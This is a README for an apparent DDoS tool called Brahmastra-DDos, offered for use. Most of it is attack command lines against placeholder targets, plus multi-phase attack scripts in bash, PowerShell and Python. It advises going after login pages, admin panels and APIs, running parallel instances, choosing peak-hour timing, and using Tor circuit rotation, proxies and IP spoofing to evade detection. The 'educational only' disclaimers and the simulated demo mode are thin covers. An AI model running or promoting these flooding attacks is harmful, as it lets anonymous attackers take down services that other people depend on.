# Brahmastra-DDos - Ultimate DDoS Tool

A powerful and feature-rich DDoS tool with advanced capabilities including **Demo Mode** and **Tor Circuit Support**.

## 🚀 Features

- **Multi-threaded attacks** for maximum efficiency
- **HTTP/2 protocol support** for modern web servers
- **Proxy rotation** from external proxy files
- **TLS/SSL encryption** with multiple cipher suites
- **User-Agent rotation** for request diversity
- **IP spoofing** capabilities
- **🆕 Demo Mode** - Safe simulation for testing and education
- **🆕 Tor Circuit Support** - Anonymous routing with circuit rotation
- **Advanced header manipulation** for stealth operations

## 🆕 Demo Mode

### What is Demo Mode?
Demo Mode is a **safe simulation feature** that mimics the DDoS attack behavior without sending actual network requests. This makes it perfect for:

- **Educational purposes** - Learn how the tool works
- **Testing configurations** - Verify your setup before real use
- **Development** - Debug and improve the tool safely
- **Demonstrations** - Show the tool's capabilities without risk

### How to Enable Demo Mode
Add `demo` or `--demo` as the last argument:

```bash
# Basic demo mode
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt demo

# Demo mode with --demo flag
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --demo
```

### Demo Mode Features
- ✅ **Safe simulation** - No real network requests
- ✅ **Real-time output** - See exactly what would happen
- ✅ **Timing accuracy** - Matches real attack duration
- ✅ **Request counting** - Track simulated request volume
- ✅ **Status monitoring** - Simulate target response checks
- ✅ **Tor integration** - Simulate Tor circuit rotation

### Demo Mode Output Example
```
[DEMO MODE] (14:30:15) Starting Demo Attack Simulation
[DEMO MODE] (14:30:15) Target: https://example.com
[DEMO MODE] (14:30:15) Duration: 5 seconds
[DEMO MODE] (14:30:15) Rate: 8 requests/second
[DEMO MODE] (14:30:15) Threads: 1
[DEMO MODE] (14:30:15) Proxy File: proxy.txt
[DEMO MODE] (14:30:16) Simulated 8 requests | Time remaining: 4s | Fake IP: 192.168.1.1
[DEMO MODE] (14:30:17) Simulated 16 requests | Time remaining: 3s | Fake IP: 10.0.0.1
[DEMO MODE] (14:30:18) Simulated 24 requests | Time remaining: 2s | Fake IP: 172.16.0.1
[DEMO MODE] (14:30:19) Simulated 32 requests | Time remaining: 1s | Fake IP: 203.0.113.1
[DEMO MODE] (14:30:20) Demo Attack Completed
[DEMO MODE] (14:30:20) Total Simulated Requests: 40
```

## 🆕 Tor Circuit Support

### What is Tor Circuit Support?
Tor Circuit Support enables **anonymous routing** through the Tor network with automatic **circuit rotation**. This provides:

- **Anonymity** - Hide your real IP address
- **Circuit rotation** - Automatic path changes for enhanced privacy
- **SOCKS5 proxy** - Seamless integration with existing proxy system
- **Configurable rotation** - Customize circuit change intervals

### How to Enable Tor Circuit Support
Add `--tor` as an argument to enable Tor routing:

```bash
# Basic Tor support
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --tor

# Custom circuit rotation interval (in seconds)
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --tor --tor-rotate=60

# Combine with demo mode
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt demo --tor
```

### Tor Circuit Features
- ✅ **SOCKS5 proxy** - Uses local Tor service (127.0.0.1:9050)
- ✅ **Circuit rotation** - Automatic path changes every 30 seconds (configurable)
- ✅ **Agent management** - Efficient connection pooling
- ✅ **Demo integration** - Simulate circuit rotation in demo mode
- ✅ **Status monitoring** - Track current circuit and rotation timing
- ✅ **IP address display** - Show current Tor exit node IP address

### Tor Circuit Output Example
```
[TOR CIRCUIT] (14:30:15) Tor Circuit Rotation Enabled
[TOR CIRCUIT] (14:30:15) Proxy: socks5://127.0.0.1:9050
[TOR CIRCUIT] (14:30:15) Rotation Interval: 30s
[TOR CIRCUIT] (14:30:15) Circuit Rotation Interval: 30s
[TOR CIRCUIT] (14:30:45) Rotated to Circuit 2
[TOR CIRCUIT] (14:31:15) Rotated to Circuit 3
```

### 🆕 Tor IP Address Display

The `--show-tor-ip` flag allows you to see the current IP address being used by your Tor connection.

#### Features
- **Real-time IP checking** - Multiple IP checking services for reliability
- **Circuit information** - Shows which Tor circuit is currently active
- **Standalone mode** - Check IP without running an attack
- **Demo integration** - Display IP during demo mode simulation

#### Usage Examples
```bash
# Standalone IP check (no attack)
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --tor --show-tor-ip

# IP check during demo mode
node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo --tor --show-tor-ip

# IP check during real attack
node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor --show-tor-ip
```

#### Output Example
```
[TOR IP CHECK] (14:30:15) Checking current Tor IP address...
[TOR IP CHECK] (14:30:16) Current Tor IP: 185.220.101.45
[TOR IP CHECK] (14:30:16) Service: https://httpbin.org/ip
[TOR IP CHECK] (14:30:16) Circuit: 1
[TOR IP CHECK] (14:30:16) Timestamp: 2024-01-15T14:30:16.123Z
```

### Tor Setup Requirements
1. **Install Tor Browser** or **Tor service**
2. **Ensure SOCKS proxy** is running on port 9050
3. **Install dependencies**: `npm install`
4. **Use --tor flag** when running the tool

## 📖 Usage

### Basic Syntax
```bash
node Brahmastra-DDos.js target time rate(32) thread proxy.txt [demo] [--tor] [--tor-rotate=N] [--show-tor-ip]
```

### Parameters
- `target` - Target URL (e.g., https://example.com)
- `time` - Attack duration in seconds
- `rate` - Requests per second (default: 32)
- `thread` - Number of attack threads
- `proxy.txt` - Proxy file path
- `[demo]` - Enable demo mode (optional)
- `[--tor]` - Enable Tor circuit support (optional)
- `[--tor-rotate=N]` - Set circuit rotation interval in seconds (optional)
- `[--show-tor-ip]` - Display current Tor IP address (requires --tor flag)

### Demo Mode Examples
```bash
# Quick 5-second demo
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt demo

# 1-minute demo with high rate
node Brahmastra-DDos.js https://example.com 60 64 4 proxy.txt demo

# 5-minute demo with multiple threads
node Brahmastra-DDos.js https://example.com 300 32 8 proxy.txt demo

# Demo with --demo flag
node Brahmastra-DDos.js https://example.com 10 16 2 proxy.txt --demo

# API endpoint demo
node Brahmastra-DDos.js https://api.example.com/endpoint 30 20 1 proxy.txt demo
```

### Tor Circuit Examples
```bash
# Basic Tor attack
node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor

# Tor with custom rotation (every 2 minutes)
node Brahmastra-DDos.js https://example.com 300 64 8 proxy.txt --tor --tor-rotate=120

# Demo mode with Tor simulation
node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo --tor

# High-intensity Tor attack
node Brahmastra-DDos.js https://example.com 120 128 16 proxy.txt --tor --tor-rotate=45

# Show Tor IP address (standalone mode)
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --tor --show-tor-ip

# Demo mode with Tor IP display
node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo --tor --show-tor-ip
```

## 🔧 Advanced Configurations

### Stealth Mode
```bash
# Low rate, multiple threads, Tor enabled
node Brahmastra-DDos.js https://target.com 180 16 12 proxy.txt --tor --tor-rotate=60
```

### High-Intensity Mode
```bash
# High rate, multiple threads, demo mode
node Brahmastra-DDos.js https://target.com 60 256 16 proxy.txt demo
```

### Extended Duration Mode
```bash
# Long attack with Tor circuit rotation
node Brahmastra-DDos.js https://target.com 600 32 8 proxy.txt --tor --tor-rotate=120
```

### API Endpoint Targeting
```bash
# Target specific API endpoints
node Brahmastra-DDos.js https://api.target.com/login 120 64 4 proxy.txt demo
```

### Multi-Target Attacks
```bash
# Run multiple instances for different targets
# Terminal 1
node Brahmastra-DDos.js https://target1.com 300 32 4 proxy.txt --tor

# Terminal 2  
node Brahmastra-DDos.js https://target2.com 300 32 4 proxy.txt --tor
```

## 🚀 Advanced Commands & Techniques

### 🔧 Advanced Configuration Options

#### Custom Tor Circuit Management
```bash
# Ultra-fast circuit rotation (every 15 seconds)
node Brahmastra-DDos.js https://target.com 120 64 8 proxy.txt --tor --tor-rotate=15

# Slow circuit rotation for stability (every 2 minutes)
node Brahmastra-DDos.js https://target.com 600 32 4 proxy.txt --tor --tor-rotate=120

# Extended attack with circuit rotation
node Brahmastra-DDos.js https://target.com 1800 16 12 proxy.txt --tor --tor-rotate=300
```

#### Advanced Demo Mode Techniques
```bash
# Long-duration demo for testing configurations
node Brahmastra-DDos.js https://target.com 300 32 8 proxy.txt demo

# High-intensity demo simulation
node Brahmastra-DDos.js https://target.com 60 512 16 proxy.txt demo

# Demo with custom timing patterns
node Brahmastra-DDos.js https://target.com 120 64 4 proxy.txt demo
```

### 🎯 Precision Targeting

#### Subdomain and Path Targeting
```bash
# Target specific subdomain
node Brahmastra-DDos.js https://api.target.com 180 32 4 proxy.txt --tor

# Target specific API endpoint
node Brahmastra-DDos.js https://target.com/api/v1/users 120 64 8 proxy.txt demo

# Target login pages
node Brahmastra-DDos.js https://target.com/login 90 128 2 proxy.txt --tor

# Target admin panels
node Brahmastra-DDos.js https://admin.target.com 300 16 6 proxy.txt --tor
```

#### Port-Specific Attacks
```bash
# Target non-standard ports
node Brahmastra-DDos.js https://target.com:8443 180 32 4 proxy.txt --tor

# Target alternative HTTP ports
node Brahmastra-DDos.js http://target.com:8080 120 64 8 proxy.txt demo
```

### ⚡ Performance Optimization

#### High-Performance Configurations
```bash
# Maximum throughput configuration
node Brahmastra-DDos.js https://target.com 60 1024 32 proxy.txt demo

# Balanced performance and stealth
node Brahmastra-DDos.js https://target.com 300 128 16 proxy.txt --tor --tor-rotate=45

# Resource-efficient long attack
node Brahmastra-DDos.js https://target.com 1800 32 8 proxy.txt --tor --tor-rotate=180
```

#### Memory and CPU Optimization
```bash
# Low-memory configuration
node Brahmastra-DDos.js https://target.com 120 16 4 proxy.txt demo

# High-CPU utilization
node Brahmastra-DDos.js https://target.com 90 512 24 proxy.txt --tor

# Balanced resource usage
node Brahmastra-DDos.js https://target.com 600 64 12 proxy.txt --tor --tor-rotate=90
```

### 🔒 Advanced Security Techniques

#### Stealth and Evasion
```bash
# Ultra-stealth mode (very low rate, high threads)
node Brahmastra-DDos.js https://target.com 600 8 24 proxy.txt --tor --tor-rotate=30

# Random timing attacks
node Brahmastra-DDos.js https://target.com 300 32 16 proxy.txt --tor --tor-rotate=60

# Distributed attack simulation
node Brahmastra-DDos.js https://target.com 180 64 8 proxy.txt demo
```

#### Proxy Optimization
```bash
# High-quality proxy rotation
node Brahmastra-DDos.js https://target.com 120 128 12 proxy.txt --tor

# Proxy performance testing
node Brahmastra-DDos.js https://target.com 60 32 4 proxy.txt demo

# Multi-proxy file usage
node Brahmastra-DDos.js https://target.com 300 64 8 proxy2.txt --tor
```

### 📊 Advanced Monitoring and Analysis

#### Performance Testing
```bash
# Baseline performance test
node Brahmastra-DDos.js https://target.com 30 32 4 proxy.txt demo

# Stress testing configuration
node Brahmastra-DDos.js https://target.com 120 256 16 proxy.txt demo

# Endurance testing
node Brahmastra-DDos.js https://target.com 1800 64 8 proxy.txt --tor
```

#### Network Analysis
```bash
# Network behavior analysis
node Brahmastra-DDos.js https://target.com 180 32 4 proxy.txt demo

# Response pattern testing
node Brahmastra-DDos.js https://target.com 90 128 8 proxy.txt --tor

# Load balancing testing
node Brahmastra-DDos.js https://target.com 300 64 12 proxy.txt demo
```

### 🎭 Advanced Demo Scenarios

#### Educational Demonstrations
```bash
# Complete attack simulation
node Brahmastra-DDos.js https://target.com 600 32 8 proxy.txt demo

# Real-time monitoring demo
node Brahmastra-DDos.js https://target.com 180 64 4 proxy.txt demo

# Performance comparison demo
node Brahmastra-DDos.js https://target.com 120 128 16 proxy.txt demo
```

#### Testing Scenarios
```bash
# Configuration validation
node Brahmastra-DDos.js https://target.com 60 32 4 proxy.txt demo

# Proxy performance testing
node Brahmastra-DDos.js https://target.com 90 64 8 proxy.txt demo

# System resource testing
node Brahmastra-DDos.js https://target.com 300 16 12 proxy.txt demo
```

### 🔧 Advanced Tor Techniques

#### Circuit Management
```bash
# Aggressive circuit rotation
node Brahmastra-DDos.js https://target.com 180 64 8 proxy.txt --tor --tor-rotate=20

# Conservative circuit rotation
node Brahmastra-DDos.js https://target.com 600 32 4 proxy.txt --tor --tor-rotate=300

# Balanced circuit strategy
node Brahmastra-DDos.js https://target.com 300 64 12 proxy.txt --tor --tor-rotate=90
```

#### IP Rotation Strategies
```bash
# Frequent IP changes
node Brahmastra-DDos.js https://target.com 120 32 8 proxy.txt --tor --tor-rotate=15

# Stable IP strategy
node Brahmastra-DDos.js https://target.com 600 64 4 proxy.txt --tor --tor-rotate=180

# IP rotation with demo mode
node Brahmastra-DDos.js https://target.com 300 32 6 proxy.txt demo --tor --tor-rotate=60
```

### 📈 Scaling and Distribution

#### Multi-Instance Attacks
```bash
# Parallel attack instances
# Instance 1: High rate, short duration
node Brahmastra-DDos.js https://target.com 60 512 16 proxy.txt --tor &

# Instance 2: Low rate, long duration
node Brahmastra-DDos.js https://target.com 1800 32 8 proxy.txt --tor &

# Instance 3: Demo mode monitoring
node Brahmastra-DDos.js https://target.com 300 64 4 proxy.txt demo
```

#### Load Distribution
```bash
# Distributed load pattern
# Primary attack
node Brahmastra-DDos.js https://target.com 300 128 16 proxy.txt --tor &

# Secondary support
node Brahmastra-DDos.js https://target.com 300 64 8 proxy.txt --tor &

# Monitoring instance
node Brahmastra-DDos.js https://target.com 300 32 4 proxy.txt demo
```

### 🎯 Specialized Attack Patterns

#### Burst Attacks
```bash
# Short, intense bursts
node Brahmastra-DDos.js https://target.com 30 1024 32 proxy.txt demo

# Multiple burst cycles
node Brahmastra-DDos.js https://target.com 60 512 24 proxy.txt --tor

# Sustained burst pattern
node Brahmastra-DDos.js https://target.com 180 256 16 proxy.txt --tor
```

#### Pulsing Attacks
```bash
# Pulsing attack pattern
node Brahmastra-DDos.js https://target.com 120 64 12 proxy.txt demo

# Variable intensity pulsing
node Brahmastra-DDos.js https://target.com 300 128 8 proxy.txt --tor

# Synchronized pulsing
node Brahmastra-DDos.js https://target.com 180 256 16 proxy.txt demo
```

### 🔍 Advanced Troubleshooting Commands

#### Diagnostic Commands
```bash
# Test help system
node Brahmastra-DDos.js --help

# Check version information
node Brahmastra-DDos.js --version

# Test Tor IP functionality
node Brahmastra-DDos.js --tor --show-tor-ip

# Validate configuration
node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt demo
```

#### Performance Diagnostics
```bash
# Memory usage test
node Brahmastra-DDos.js https://target.com 60 32 4 proxy.txt demo

# CPU utilization test
node Brahmastra-DDos.js https://target.com 90 128 16 proxy.txt demo

# Network performance test
node Brahmastra-DDos.js https://target.com 120 64 8 proxy.txt --tor
```

### ⚙️ Advanced Configuration & Environment

#### Environment Variables
```bash
# Set custom Tor proxy
export TOR_PROXY="socks5://127.0.0.1:9050"
export TOR_ROTATION_INTERVAL="45"

# Set performance limits
export MAX_MEMORY_USAGE="1024"
export MAX_CPU_USAGE="80"

# Set logging level
export LOG_LEVEL="debug"
export LOG_TO_FILE="true"

# Run with environment variables
node Brahmastra-DDos.js https://target.com 300 64 8 proxy.txt --tor
```

#### Configuration File Usage
```bash
# Use custom configuration
node Brahmastra-DDos.js --config=./custom-config.js https://target.com 180 32 4 proxy.txt

# Load environment-specific config
NODE_ENV=production node Brahmastra-DDos.js https://target.com 600 16 8 proxy.txt --tor

# Use multiple config files
node Brahmastra-DDos.js --config=./tor-config.js --config=./performance-config.js https://target.com 300 64 12 proxy.txt
```

### 🔧 Advanced Scripting & Automation

#### Bash Scripts for Complex Attacks
```bash
#!/bin/bash
# multi-phase-attack.sh

echo "Starting multi-phase attack..."

# Phase 1: Reconnaissance (demo mode)
echo "Phase 1: Reconnaissance"
node Brahmastra-DDos.js https://target.com 60 32 4 proxy.txt demo

# Phase 2: Light attack
echo "Phase 2: Light attack"
node Brahmastra-DDos.js https://target.com 180 64 8 proxy.txt --tor &

# Phase 3: Heavy attack
echo "Phase 3: Heavy attack"
sleep 30
node Brahmastra-DDos.js https://target.com 120 256 16 proxy.txt --tor &

# Phase 4: Sustained attack
echo "Phase 4: Sustained attack"
sleep 60
node Brahmastra-DDos.js https://target.com 600 32 12 proxy.txt --tor --tor-rotate=45
```

#### PowerShell Scripts (Windows)
```powershell
# multi-phase-attack.ps1

Write-Host "Starting multi-phase attack..." -ForegroundColor Green

# Phase 1: Demo mode
Write-Host "Phase 1: Demo mode" -ForegroundColor Yellow
Start-Process -NoNewWindow node -ArgumentList "Brahmastra-DDos.js https://target.com 60 32 4 proxy.txt demo"

# Phase 2: Tor attack
Write-Host "Phase 2: Tor attack" -ForegroundColor Yellow
Start-Process -NoNewWindow node -ArgumentList "Brahmastra-DDos.js https://target.com 300 64 8 proxy.txt --tor"

# Phase 3: High-intensity
Write-Host "Phase 3: High-intensity" -ForegroundColor Yellow
Start-Sleep -Seconds 30
Start-Process -NoNewWindow node -ArgumentList "Brahmastra-DDos.js https://target.com 180 512 16 proxy.txt --tor --tor-rotate=30"
```

#### Python Automation Scripts
```python
#!/usr/bin/env python3
# advanced_attack_controller.py

import subprocess
import time
import threading
import json

class AttackController:
    def __init__(self, target, proxy_file):
        self.target = target
        self.proxy_file = proxy_file
        self.processes = []
    
    def start_attack(self, duration, rate, threads, tor=False, demo=False):
        cmd = [
            "node", "Brahmastra-DDos.js",
            self.target, str(duration), str(rate), str(threads),
            self.proxy_file
        ]
        
        if tor:
            cmd.append("--tor")
        if demo:
            cmd.append("demo")
        
        process = subprocess.Popen(cmd)
        self.processes.append(process)
        return process
    
    def multi_phase_attack(self):
        # Phase 1: Demo reconnaissance
        print("Phase 1: Demo reconnaissance")
        self.start_attack(60, 32, 4, demo=True)
        time.sleep(70)
        
        # Phase 2: Light Tor attack
        print("Phase 2: Light Tor attack")
        self.start_attack(180, 64, 8, tor=True)
        time.sleep(30)
        
        # Phase 3: Heavy attack
        print("Phase 3: Heavy attack")
        self.start_attack(120, 256, 16, tor=True)
        
        # Wait for completion
        for process in self.processes:
            process.wait()

# Usage
controller = AttackController("https://target.com", "proxy.txt")
controller.multi_phase_attack()
```

### 📊 Advanced Monitoring & Metrics

#### Real-time Performance Monitoring
```bash
# Monitor system resources during attack
watch -n 1 'echo "CPU: $(top -bn1 | grep "Cpu(s)" | awk "{print \$2}")% | Memory: $(free -m | awk "NR==2{printf \"%.1f%%\", \$3*100/\$2}") | Load: $(uptime | awk -F"load average:" "{print \$2}")"'

# Monitor network activity
iftop -i eth0

# Monitor process activity
htop

# Monitor disk I/O
iotop
```

#### Log Analysis & Reporting
```bash
# Analyze attack logs
grep "SUCCESS" brahmastra-ddos.log | wc -l

# Generate performance report
awk '/Duration:/ {print $2}' brahmastra-ddos.log | tail -10

# Monitor error rates
grep "ERROR" brahmastra-ddos.log | wc -l

# Track Tor circuit rotations
grep "TOR CIRCUIT" brahmastra-ddos.log | tail -20
```

### 🎯 Advanced Targeting Strategies

#### Geographic Targeting
```bash
# Target specific regions through Tor
# Use Tor exit nodes in specific countries
node Brahmastra-DDos.js https://target.com 300 64 8 proxy.txt --tor --tor-rotate=30

# Rotate through multiple geographic locations
for i in {1..5}; do
    node Brahmastra-DDos.js https://target.com 60 128 16 proxy.txt --tor --tor-rotate=15 &
    sleep 10
done
```

#### Time-based Attacks
```bash
# Peak hour attacks
node Brahmastra-DDos.js https://target.com 180 256 24 proxy.txt --tor

# Off-peak stealth attacks
node Brahmastra-DDos.js https://target.com 600 16 8 proxy.txt --tor --tor-rotate=120

# Weekend attacks
node Brahmastra-DDos.js https://target.com 3600 32 12 proxy.txt --tor --tor-rotate=180
```

#### Protocol-specific Attacks
```bash
# HTTP/2 specific targeting
node Brahmastra-DDos.js https://target.com 120 64 8 proxy.txt --tor

# API endpoint targeting
node Brahmastra-DDos.js https://api.target.com/v1/users 180 128 16 proxy.txt demo

# WebSocket targeting
node Brahmastra-DDos.js https://target.com/ws 90 256 8 proxy.txt --tor
```

### 🛡️ Advanced Security & Best Practices

#### Security Considerations
```bash
# Use demo mode for testing
node Brahmastra-DDos.js https://target.com 60 32 4 proxy.txt demo

# Enable Tor for anonymity
node Brahmastra-DDos.js https://target.com 180 64 8 proxy.txt --tor

# Rotate circuits frequently
node Brahmastra-DDos.js https://target.com 300 32 12 proxy.txt --tor --tor-rotate=30

# Use high-quality proxies
node Brahmastra-DDos.js https://target.com 120 128 16 proxy.txt --tor
```

#### Legal and Ethical Guidelines
```bash
# Only test systems you own or have permission to test
# Use demo mode for educational purposes
node Brahmastra-DDos.js https://example.com 30 16 2 proxy.txt demo

# Respect rate limits and avoid overwhelming services
node Brahmastra-DDos.js https://target.com 180 32 8 proxy.txt --tor

# Document all testing activities
# Maintain audit trails for compliance
```

#### Advanced Evasion Techniques
```bash
# Random timing patterns
node Brahmastra-DDos.js https://target.com 300 32 16 proxy.txt --tor --tor-rotate=60

# Variable intensity attacks
node Brahmastra-DDos.js https://target.com 180 64 8 proxy.txt --tor --tor-rotate=45

# Stealth mode (low rate, high threads)
node Brahmastra-DDos.js https://target.com 600 8 24 proxy.txt --tor --tor-rotate=90
```

### 🔬 Advanced Research & Development

#### Performance Research
```bash
# Baseline performance testing
node Brahmastra-DDos.js https://target.com 30 32 4 proxy.txt demo

# Stress testing limits
node Brahmastra-DDos.js https://target.com 60 1024 32 proxy.txt demo

# Endurance testing
node Brahmastra-DDos.js https://target.com 1800 64 8 proxy.txt --tor

# Resource utilization analysis
node Brahmastra-DDos.js https://target.com 120 128 16 proxy.txt demo
```

#### Network Analysis
```bash
# Response pattern analysis
node Brahmastra-DDos.js https://target.com 180 32 4 proxy.txt demo

# Load balancing behavior
node Brahmastra-DDos.js https://target.com 300 64 12 proxy.txt demo

# Protocol behavior testing
node Brahmastra-DDos.js https://target.com 90 128 8 proxy.txt --tor
```

### 📚 Advanced Learning Resources

#### Command Reference
```bash
# Quick reference for common patterns
node Brahmastra-DDos.js --help

# Version information
node Brahmastra-DDos.js --version

# Demo mode examples
node Brahmastra-DDos.js https://example.com 10 16 2 proxy.txt demo

# Tor configuration examples
node Brahmastra-DDos.js --tor --show-tor-ip
```

#### Advanced Usage Patterns
```bash
# Multi-phase attacks
# Phase 1: Reconnaissance
node Brahmastra-DDos.js https://target.com 60 32 4 proxy.txt demo

# Phase 2: Light attack
node Brahmastra-DDos.js https://target.com 180 64 8 proxy.txt --tor &

# Phase 3: Heavy attack
sleep 30
node Brahmastra-DDos.js https://target.com 120 256 16 proxy.txt --tor
```

### 🎯 Pro Tips & Advanced Techniques

#### Optimization Strategies
```bash
# Use appropriate thread counts for your system
# Balance rate vs. threads for optimal performance
# Monitor system resources during attacks
# Use demo mode to test configurations before real attacks
# Rotate Tor circuits based on your anonymity needs
```

#### Troubleshooting Advanced Issues
```bash
# Check Tor service status
# Verify proxy file format and accessibility
# Monitor system resource usage
# Use demo mode to isolate configuration issues
# Check network connectivity and firewall settings
```

## 📁 File Structure
```
Brahmastra-DDos_by_vip/
├── Brahmastra-DDos.js    # Main tool file
├── package.json          # Dependencies and scripts
├── proxy.txt            # Proxy list file
├── README.md            # This documentation
├── demo-examples.bat    # Windows demo examples
├── demo-examples.sh     # Linux/macOS demo examples
└── DEMO-MODE-GUIDE.md   # Detailed demo mode guide
```

## 🚀 Quick Start

### 1. Install Dependencies
```bash
npm install
```

### 2. Prepare Proxy File
Create `proxy.txt` with your proxies:
```
proxy1.com:8080
proxy2.com:3128
proxy3.com:80
```

### 3. Run Demo Mode
```bash
# Test the tool safely
node Brahmastra-DDos.js https://example.com 10 16 2 proxy.txt demo
```

### 4. Enable Tor Support
```bash
# Run with Tor circuit rotation
node Brahmastra-DDos.js https://example.com 60 32 4 proxy.txt --tor
```

## ⚠️ Important Notes

### Demo Mode
- **No real attacks** are performed
- **Safe for testing** and education
- **Realistic simulation** of attack behavior
- **No network impact** on targets

### Tor Circuit Support
- **Requires Tor service** running locally
- **SOCKS proxy** must be available on port 9050
- **Circuit rotation** happens automatically
- **Enhanced anonymity** but may reduce speed

### General Usage
- **Educational purposes only** - Do not use for illegal activities
- **Respect rate limits** - Avoid overwhelming legitimate services
- **Use responsibly** - This tool is for testing and research
- **Comply with laws** - Ensure you have permission to test targets

## 🔍 Troubleshooting

### Demo Mode Issues
- **"Demo mode not working"** - Ensure `demo` or `--demo` is the last argument
- **"No output"** - Check that all required arguments are provided
- **"Invalid target"** - Verify the target URL format

### Tor Circuit Issues
- **"Tor not working"** - Ensure Tor service is running on port 9050
- **"Connection refused"** - Check if SOCKS proxy is accessible
- **"Circuit rotation not working"** - Verify rotation interval is set correctly

### General Issues
- **"Module not found"** - Run `npm install` to install dependencies
- **"Proxy file not found"** - Ensure `proxy.txt` exists in the current directory
- **"Invalid arguments"** - Check the command syntax and parameter order

## ❓ FAQ

### Demo Mode
**Q: Is demo mode completely safe?**
A: Yes, demo mode performs no real network requests and is completely safe for testing.

**Q: Can I use demo mode without proxies?**
A: Yes, demo mode simulates the entire attack including proxy usage without actual connections.

**Q: Does demo mode show realistic timing?**
A: Yes, demo mode accurately simulates the timing and rate of real attacks.

### Tor Circuit Support
**Q: Do I need to install Tor Browser?**
A: You need either Tor Browser or a Tor service running with SOCKS proxy on port 9050.

**Q: How often do circuits rotate?**
A: Default is every 30 seconds, but you can customize with `--tor-rotate=N`.

**Q: Does Tor affect attack performance?**
A: Tor routing may reduce speed but provides enhanced anonymity and security.

### General Usage
**Q: What's the difference between rate and threads?**
A: Rate = requests per second, threads = concurrent processes for parallel attacks.

**Q: Can I use this without proxies?**
A: The tool requires a proxy file, but you can create one with dummy entries for testing.

**Q: Is this tool legal to use?**
A: The tool itself is legal, but usage must comply with local laws and only target systems you own or have permission to test.

## 📝 License

This project is licensed under the MIT License - see the LICENSE file for details.

## ⚠️ Disclaimer

This tool is provided for **educational and testing purposes only**. Users are responsible for ensuring they have proper authorization before testing any systems. The developers are not responsible for any misuse of this tool.

---

**🆕 New Features**: Demo Mode and Tor Circuit Support are now available! Test safely and stay anonymous with the latest enhancements.
